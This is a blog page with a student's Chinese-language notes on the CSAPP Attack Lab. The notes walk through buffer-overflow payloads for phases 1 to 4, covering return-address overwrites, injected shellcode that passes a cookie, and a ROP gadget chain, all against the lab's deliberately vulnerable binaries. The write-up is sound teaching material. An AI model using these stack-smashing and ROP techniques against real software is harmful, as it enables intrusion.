<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="IE=edge">

<title>CSAPP Attack Lab 笔记 | Amiriox's Storage
</title>


  <meta name="description" content="世界再大 不过是些代价">



  <link rel="icon" href="/images/favicon-32x32.ico">



<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;700;900&family=Lora:ital,wght@0,400;0,600;1,400&family=Libre+Baskerville:wght@400;700&display=swap" rel="stylesheet">

<link rel="stylesheet" href="/css/style.css">



<script>
  window.MathJax = {
    tex: {
      inlineMath: [['$', '$'], ['\\(', '\\)']],
      displayMath: [['$$', '$$'], ['\\[', '\\]']],
      processEscapes: true,
      processEnvironments: true,
      tags: 'ams'
    },
    options: {
      skipHtmlTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    },
    svg: {
      fontCache: 'global'
    }
  };
</script>
<script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-svg.js"></script>


<!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="Amiriox's Storage" type="application/atom+xml">
</head>
<body>
  <div class="newspaper-wrapper">
    <header class="newspaper-header">
  <div class="header-top">
    <div class="header-edition">Morning Edition</div>
    <div class="header-date">星期二, 二月 3, 2026</div>
    <button class="theme-toggle" aria-label="Toggle dark mode">
      <span class="toggle-sun">☀</span>
      <span class="toggle-moon">☾</span>
    </button>
  </div>
  
  <div class="masthead">
    <h1 class="newspaper-title">
      <a href="/">折鸦夜明け前</a>
    </h1>
    <p class="newspaper-motto">我们的同志在困难的时候，要看到成绩，要看到光明，要提高我们的勇气。</p>
  </div>
  
  <nav class="newspaper-nav">
    <div class="nav-divider"></div>
    <ul class="nav-menu">
      
        <li class="nav-item">
          <a href="/" class="nav-link">Home</a>
        </li>
      
        <li class="nav-item">
          <a href="/archives" class="nav-link">Archives</a>
        </li>
      
        <li class="nav-item">
          <a href="/categories" class="nav-link">Categories</a>
        </li>
      
        <li class="nav-item">
          <a href="/tags" class="nav-link">Tags</a>
        </li>
      
        <li class="nav-item">
          <a href="/about" class="nav-link">About</a>
        </li>
      
    </ul>
    <div class="nav-divider"></div>
  </nav>
</header>

    
    <main class="newspaper-content">
      
<div class="post-container">
  <article class="post-full">
    <header class="post-header">
      <div class="post-meta-top">
        
          <span class="post-category">组成原理</span>
        
        <time datetime="2024-12-29T13:53:00.000Z" class="post-date">
          星期日, 十二月 29, 2024</time>
      </div>
      
      <h1 class="post-title">CSAPP Attack Lab 笔记</h1>
      
      
      
      <div class="post-byline">
        
          <span class="post-author">By 折鸦夜明け前</span>
        
        
          <span class="post-updated">Updated 十二月 31, 2025</span>
        
      </div>
    </header>
    
    <div class="post-divider"></div>
    
    <div class="post-content">
      <h2 id="phase-0x1">Phase 0x1</h2>
<p>一个练手的，要求通过缓冲区栈溢出攻击来调用 touch1</p>
<p><code>gdb ctarget</code> 然后 <code>set args -q</code>
防止与不存在的服务器通信（<code>run -q</code> 也可以)
<code>b Gets</code> <code>run -q</code></p>
<p>看一下栈信息:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">────────────────────────[ STACK ]────────────────────────</span><br><span class="line">00:0000│ rsp 0x5561dc70 —▸ 0x4017b4 (getbuf+12) ◂— movl $1, %eax</span><br><span class="line">01:0008│ rdi 0x5561dc78 ◂— 0</span><br><span class="line">... ↓        3 skipped</span><br><span class="line">05:0028│     0x5561dc98 —▸ 0x55586000 ◂— 0</span><br><span class="line">06:0030│     0x5561dca0 —▸ 0x401976 (test+14) ◂— movl %eax, %edx</span><br><span class="line">07:0038│     0x5561dca8 —▸ 0x55685fe8 —▸ 0x402fa5 ◂— pushq $0x3a6971 /* &#x27;hqi:&#x27; */</span><br></pre></td></tr></table></figure>
<span id="more"></span>
<p>rsp 是当前栈顶指针，由于是在 Gets 的开头查看的，所以栈顶存的就是 Gets
的返回地址</p>
<p>思路应该是覆盖栈顶指针 <code>0x5561dc70</code> 处的 正确返回地址为
<code>touch1</code> 的地址<code>0x4017c0</code></p>
<p>如何覆盖？看一下读入字符串的逻辑：</p>
<p><code>_IO_getc@plt</code> 很明显是库函数 getchar()<br />
那附近是一个循环，如果是 -1 (<code>0x7ffffffff</code>) 就跳出，<br />
如果不是 0xA (经查表这个就是 ASCII 的行分隔符）就读入下一个 char</p>
<p>那就看一下读入单个字符的逻辑<br />
$rbx = $rdi, 推测 $rdi 作为 Gets()
的第一个参数就是存到的字符串地址<br />
也就是说 (%rdi) 应该就是我们输入的字符串存储地址的第一位
当然这里因为要调用 <code>_IO_getc</code> 并且 rdi
是调用者保存寄存器<br />
所以先用 rbx 存一下 rdi</p>
<p>看了下 Gets 的 $rdi 存的是 <code>0x5561dc78</code><br />
发现其实缓冲区不在 Gets() 的栈帧里(78 &gt; 70, 栈内存向低地址增长）…</p>
<p>重新观察 <code>getbuf</code> 的汇编代码，发现
<code>sub $0x28, %rsp</code>，分配了 40 字节的缓冲区<br />
由于缓冲区栈溢出攻击的原理大概是这样：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// 注意这个栈是从高地址向低地址增加的</span><br><span class="line"></span><br><span class="line">+------------------------+ 高地址</span><br><span class="line">| caller 返回地址        | &lt;- 函数返回时跳转的位置 0x5561dca0</span><br><span class="line">+------------------------+</span><br><span class="line">| buffer[40]             | &lt;- callee 的栈帧</span><br><span class="line">| buffer[39]             |</span><br><span class="line">| ...                    | &lt;- 缓冲区</span><br><span class="line">| buffer[1]              |</span><br><span class="line">| buffer[0]              | &lt;- 缓冲区起始           0x5561dc78</span><br><span class="line">+------------------------+ 低地址</span><br></pre></td></tr></table></figure>
<p>所以只能向相对缓冲区更高的地址溢出，于是换个思路，在 getbuf 处 ret 到
<code>touch1()</code><br />
所以就不用考虑 Gets 的细节了，一共 40 字节的 buffer, 直接填充 40 个
<code>00</code>，<br />
然后填充 <code>c0 17 40</code> 即可(gdb 中在 getbuf 起始处看 %rsp
也能发现就是 <code>0x5561dca0 = 0x5561dc78 + 0x28</code> )</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">c0 17 40</span><br></pre></td></tr></table></figure>
<p>一个地址对应的通常是一字节，而一个十六进制的每个位数是 4 个二进制位
(1111=15=f)</p>
<p>两个十六进制位就是一字节。</p>
<p>由于只有网络协议相关会用大端法，所以这里是小端法，地址小的位置存的是低位</p>
<p>至于 <code>hex2raw</code> (Hexadecimal to Raw), 其实就是
<code>echo -n -e "\xc0\x17\x40"</code></p>
<h2 id="phase-0x2">Phase 0x2</h2>
<p>要求将 <code>cookie.txt</code> 作为参数传递给 <code>touch2()</code>
并调用</p>
<p>至此调用函数我们已经非常熟悉了，直接填充对应函数的地址到溢出后的位置即可。<br />
但是我们还需要传递参数，所以就不能再填充 <code>00</code> 了。<br />
这个 <code>ctarget</code>
编译时是关闭栈保护的，也就是说栈内存上的代码可以直接被执行。</p>
<p>编写 <code>phase2_inject.asm</code>:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov      $0x59b997fa, %rdi</span><br><span class="line">pushq    $0x4017ec</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
<p>其中，<code>0x59b997fa</code> 是 cookie，<code>0x4017ec</code> 是
<code>touch2()</code> 的地址。<br />
当然这个是 AT&amp;T 的语法，<code>nasm</code> 默认似乎是 Intel，所以我用
<code>as</code></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">as phase2_inject.asm</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">objdump -d a.out</span></span><br><span class="line"></span><br><span class="line">a.out:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi</span><br><span class="line">   7:   68 ec 17 40 00          push   $0x4017ec</span><br><span class="line">   c:   c3</span><br></pre></td></tr></table></figure>
<p>于是得到了我们的 <code>inraw.txt</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 fa 97 b9 59 90 </span><br><span class="line">68 ec 17 40 00 90 90 90 </span><br><span class="line">c3 00 00 00 00 00 00 00 </span><br><span class="line">90 90 90 90 90 90 90 90 </span><br><span class="line">90 90 90 90 90 90 90 90 </span><br><span class="line">78 dc 61 55 00 00 00 00</span><br></pre></td></tr></table></figure>
<p>这里 90 是 <code>nop</code>, 用于填充的，不过似乎不需要?<br />
返回地址也直接覆盖为 <code>0x5561dc78</code>，
缓冲区开始的地方，也就是我们注入代码开始的地方<br />
还是要注意小端法。</p>
<p>(用时最短的一个，第一个做完第二个就轻车熟路了)</p>
<h2 id="phase-0x3">Phase 0x3</h2>
<p>查看 <code>attack.pdf</code> 的要求，发现主要是把 cookie
十六进制对应的字符串 ( <span class="math inline">\(without\ a\ leading\
\)</span> <code>0x</code> ), 然后用 <code>hexmatch</code>
比较是否相等。</p>
<p>但是这个 <code>hexmatch</code> 写得太折磨了。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">hexmatch</span><span class="params">(<span class="type">unsigned</span> val, <span class="type">char</span> * sval)</span> &#123;</span><br><span class="line">    <span class="type">char</span> cbuf[<span class="number">110</span>];</span><br><span class="line">    <span class="type">char</span> *s = cbuf + random() % <span class="number">100</span>;</span><br><span class="line">    <span class="built_in">sprintf</span>(s, <span class="string">&quot;%.8x&quot;</span>, sval);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">strncmp</span>(sval, s, <span class="number">9</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个 110 大小的缓冲区 <code>cbuf</code> 会把我们 inject code 和
cookie string 所在的缓冲区弄得一团糟，而且 random
的存在导致我们不能直接填充这个地址。</p>
<p>解决方案有点取巧。在 gdb 中打断点，分别在 <code>touch3()</code>
起始和<code>hexmatch()</code> 后检查缓冲区 <code>x/100bx 0x556178</code>
，找到前后没变并且<del>看起来</del>没什么用的区域填充 cookie。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 b3 dc 61 55 90 </span><br><span class="line">68 fa 18 40 00 90 90 90 </span><br><span class="line">c3 90 90 90 90 90 90 90 </span><br><span class="line">90 90 90 90 90 90 90 90 </span><br><span class="line">90 90 90 90 90 90 90 90 </span><br><span class="line">78 dc 61 55 00 00 00 00 </span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 35 39 62 39 39 </span><br><span class="line">37 66 61 00 90 90 90 90 </span><br></pre></td></tr></table></figure>
<p>这里 <code>0x5561dcb3</code> 及之后是 cookie。 (注意结尾
<code>\0</code> )</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.. .. .. 35 39 62 39 39 </span><br><span class="line">37 66 61 00 .. .. .. ..</span><br></pre></td></tr></table></figure>
<p>完美通过。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">amiriox@makinohara ‹ master ●● › : ~/csapplab/attacklab</span><br><span class="line">[] ξ ./hex2raw &lt; inraw.txt &gt; in.txt &amp;&amp; ./ctarget -q &lt; in.txt</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch3!: You called touch3(&quot;59b997fa&quot;)</span><br><span class="line">Valid solution for level 3 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">    user id    bovik</span><br><span class="line">    course    15213-f15</span><br><span class="line">    lab    attacklab</span><br><span class="line">    result    1:PASS:0xffffffff:ctarget:3:48 C7 C7 B3 DC 61 55 90 68 FA 18 40 00 90 90 90 C3 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 78 DC 61 55 00 00 00 00 90 90 90 90 90 90 90 90 90 90 90 35 39 62 39 39 37 66 61 00 90 90 90 90 </span><br></pre></td></tr></table></figure>
<h2 id="phase-0x4">Phase 0x4</h2>
<p><code>attack.pdf</code> 中介绍了关于 <code>ROP</code> 的相关知识.</p>
<p>因此推测思路是，通过缓冲区溢出攻击在栈顶放 cookie,<br />
通过 <code>popq %rdi</code> 恢复到 %rdi 寄存器以传参,<br />
然后 <code>call 0x4017ec</code> (<code>touch2()</code>).<br />
但是 gadgets farm 中没有出现 call 的 gadget, 所以只能用 <code>ret</code>
转移到 <code>touch2()</code>,<br />
这样就要保证 <code>popq</code> 弹栈恢复 %rdi 之后的栈顶是
<code>0x4017ec</code>.</p>
<ul>
<li><code>popq %rdi</code> 的机器码是 <code>5f</code></li>
<li><code>ret</code> 的机器码是 <code>c3</code></li>
<li>需要用 <code>nop</code> 即 <code>90</code> 对齐</li>
</ul>
<p>有两个问题需要考虑: 1. 前几个 phase
是上周做的了，这几天一直在复习高数，所以栈的布局还得再研究一下 2.
怎么执行到第一个 gadget ? 第一个 gadget <code>ret</code> 后，会通过 ret
弹出栈顶的地址并跳转到那个地址实现链式调用.</p>
<p>solve: 1. 返回地址在栈上的位置是 <code>0x5561dca0</code> =
<code>0x5561dc78</code> + <code>0x28</code> 2. 第一个 gadget 大概直接在
<code>0x5561dca0</code> 写地址就行，栈保护是没事的因为 gadget
不在栈内存，但是地址随机化不好说。</p>
<p>紧接着发现 gadget farm 里没有 <code>5f</code>, 感觉很不解,
这么精妙的做法, 这 lab 不这么解说明教授水平不行啊。<br />
<code>attacklab.pdf</code> 说只需要两条指令就能做 phase 4, 但是调用
touch2 的 ret 肯定需要一条， 剩下的除了 <code>popq</code>
还能是什么?</p>
<p>谔谔, 卡了半天决定去看 <a
target="_blank" rel="noopener" href="https://arthals.ink/blog/attack-lab">Arthals
在北大计算机系统导论（ICS）课程中所做的详尽笔记</a><br />
这个 lab 是北京大学改过的(甚至还买了 csapp 的版权, 9
爷吃的就是好啊)。<br />
然后发现他们也没给 <code>5f</code>, 那我估计就是先 <code>pop</code> 再
<code>mov</code>, ugly.</p>
<p>重新审阅 <code>rtarget.asm</code> 中 <code>start_farm</code> 到
<code>mid_farm</code> 之间的机器码, 发现有 <code>58</code> 即
<code>popq %rax</code><br />
则我们需要</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">popq    %rax;       ret   # 58 90 c3 at 0x4019cc</span><br><span class="line">movl/q  %rax, %rdi; ret   # 48 89 c7 at 0x4019a2</span><br></pre></td></tr></table></figure>
<p>填充 <code>inraw.txt</code>, 当然传递给 <code>hex2raw</code>
的是不能有注释的.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">cc 19 40 00 00 00 00 00 # 缓冲区溢出的返回地址, 这里 ROP 直接进第一个 gadget = popq %rax; ret</span><br><span class="line">fa 97 b9 59 00 00 00 00 # cookie</span><br><span class="line">a2 19 40 00 00 00 00 00 # movq %rax, %rdi; ret</span><br><span class="line">ec 17 40 00 00 00 00 00 # touch2() 的地址</span><br></pre></td></tr></table></figure>
<p>栈中的情况和具体执行流程:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">+---------------------------+ 高地址</span><br><span class="line">| touch2() 的地址           | &lt;- 由第二个 gadget movq ret 而来.</span><br><span class="line">| movq %rax, %rdi; ret      | &lt;- 由第一个 gadget popq ret 而来, 所谓 gadget 的链式调用。</span><br><span class="line">+---------------------------+</span><br><span class="line">| cookie,被popq弹出,放入rax | &lt;- 缓冲区溢出时地址累加, 但栈向低地址扩张 </span><br><span class="line">| popq %rax; ret            | &lt;- 函数返回时跳转的位置, 弹出 cookie 后栈顶是 movq， 于是 ret 到那里</span><br><span class="line">+---------------------------+</span><br><span class="line">| buffer[40]                | &lt;- callee 的栈帧</span><br><span class="line">| buffer[39]                |</span><br><span class="line">| ... 我们填了40 字节的0    | &lt;- 缓冲区</span><br><span class="line">| buffer[1]                 |</span><br><span class="line">| buffer[0]                 | &lt;- 缓冲区起始           0x5561dc78</span><br><span class="line">+---------------------------+ 低地址</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><del>其实这里直接过了我不太理解的, 为什么不需要保持 rsp 16
位对齐啊?</del></p>
<p>这里没有发生段错误而是直接栈对齐了是因为恰好两次 ret, 每次 +8,<br />
然后调用 touch2 时满足了 rsp 16 位对齐。</p>
<p>说是普通的运算不需要一直保持 <code>rsp % 16 == 0</code>,
只需要在函数调用时满足就可以了, 具体还有待后续学习.</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">amiriox@makinohara ‹ master ●● › : ~/csapplab/attacklab</span><br><span class="line">[1] ξ ./hex2raw &lt; inraw.txt &gt; in.txt &amp;&amp; ./rtarget -q &lt; in.txt</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Misfire: You called touch2(0x3928c8e0)</span><br><span class="line">Ouch!: You caused a segmentation fault!</span><br><span class="line">Better luck next time</span><br><span class="line">FAIL: Would have posted the following:</span><br><span class="line">	user id	bovik</span><br><span class="line">	course	15213-f15</span><br><span class="line">	lab	attacklab</span><br><span class="line">	result	1:FAIL:0xffffffff:rtarget:0:9E 19 40 00 00 00 00 00 CC 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 A2 19 40 00 00 00 00 00 9E 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00 </span><br></pre></td></tr></table></figure>

    </div>
    
    
      <footer class="post-footer">
        <div class="post-tags">
          <strong>Filed under:</strong>
          
            <a href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/" class="tag">#计算机科学</a>
          
            <a href="/tags/CSAPP-cmu15213/" class="tag">#CSAPP/cmu15213</a>
          
        </div>
      </footer>
    
    
    <div class="post-nav">
      
        <a href="/2025/01/19/CSAPP-2025-01-19/" class="post-nav-prev">
          <span class="nav-label">← Previous Story</span>
          <span class="nav-title">CSAPP3e第二章(整数的表示)</span>
        </a>
      
      
      
        <a href="/2024/12/14/CSAPP-Lab-Bomb/" class="post-nav-next">
          <span class="nav-label">Next Story →</span>
          <span class="nav-title">CSAPP Bomb Lab 达成</span>
        </a>
      
    </div>
  </article>
  
  
    <aside class="post-sidebar">
  
    <div class="sidebar-toc">
      <h3 class="sidebar-title">Table of Contents</h3>
      <div class="toc-content">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#phase-0x1"><span class="toc-number">1.</span> <span class="toc-text">Phase 0x1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#phase-0x2"><span class="toc-number">2.</span> <span class="toc-text">Phase 0x2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#phase-0x3"><span class="toc-number">3.</span> <span class="toc-text">Phase 0x3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#phase-0x4"><span class="toc-number">4.</span> <span class="toc-text">Phase 0x4</span></a></li></ol>
      </div>
    </div>
  
  
  
    <div class="sidebar-author">
      <div class="author-avatar avatar-rounded">
        <img src="/images/icon.jpg" alt="Avatar">
      </div>
      <p class="author-name">折鸦夜明け前</p>
    </div>
  
  
  
    <div class="sidebar-social">
      <h3 class="sidebar-title">Follow</h3>
      <ul class="social-links">
        
          <li>
            <a href="https://github.com/amiriox" target="_blank" rel="noopener">GitHub</a>
          </li>
        
          <li>
            <a href="mailto:wumingyun2120@gmail.com" target="_blank" rel="noopener">E-Mail</a>
          </li>
        
          <li>
            <a href="https://www.zhihu.com/people/wu-ming-57-22-24" target="_blank" rel="noopener">Zhihu</a>
          </li>
        
          <li>
            <a href="https://space.bilibili.com/444947789" target="_blank" rel="noopener">Bilibili</a>
          </li>
        
      </ul>
    </div>
  
  
  
    <div class="sidebar-links">
      <h3 class="sidebar-title">友情链接</h3>
      <ul class="friend-links">
        
          <li>
            <a href="https://kawayww.com/" target="_blank" rel="noopener">柳下川的博客</a>
          </li>
        
          <li>
            <a href="https://www.overturn.cn/" target="_blank" rel="noopener">远视台</a>
          </li>
        
      </ul>
    </div>
  
</aside>

  
</div>

    </main>
    
    <footer class="newspaper-footer">
  <div class="footer-divider"></div>
  
  <div class="footer-content">
    <div class="footer-section">
      <h3>折鸦夜明け前</h3>
      <p>Est. 2020</p>
      
        <p class="footer-since">Since 2023</p>
      
    </div>
    
    
    <div class="footer-section">
      <h3>Follow Us</h3>
      <ul class="social-links">
        
          <li><a href="https://github.com/amiriox" target="_blank" rel="noopener">GitHub</a></li>
        
          <li><a href="mailto:wumingyun2120@gmail.com" target="_blank" rel="noopener">E-Mail</a></li>
        
          <li><a href="https://www.zhihu.com/people/wu-ming-57-22-24" target="_blank" rel="noopener">Zhihu</a></li>
        
          <li><a href="https://space.bilibili.com/444947789" target="_blank" rel="noopener">Bilibili</a></li>
        
      </ul>
    </div>
    
    
    
    <div class="footer-section">
      <h3>友情链接</h3>
      <ul class="footer-links">
        
          <li><a href="https://kawayww.com/" target="_blank" rel="noopener">柳下川的博客</a></li>
        
          <li><a href="https://www.overturn.cn/" target="_blank" rel="noopener">远视台</a></li>
        
      </ul>
    </div>
    
    
    <div class="footer-section">
      <h3>Navigation</h3>
      <ul class="footer-nav">
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/archives">Archives</a></li>
        
          <li><a href="/categories">Categories</a></li>
        
          <li><a href="/tags">Tags</a></li>
        
          <li><a href="/about">About</a></li>
        
      </ul>
    </div>
  </div>
  
  <div class="footer-bottom">
    <p>© 2025 The Daily Amiriox Makinohara. All Rights Reserved.</p>
    <p>
      
        Made with <span class="footer-icon icon-animated" style="color: #8b0000">⚂</span> · 
      
      Powered by <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> · Theme Newspepper
    </p>
  </div>
</footer>

  </div>
  
  <script src="/js/script.js"></script>

</body>
</html>
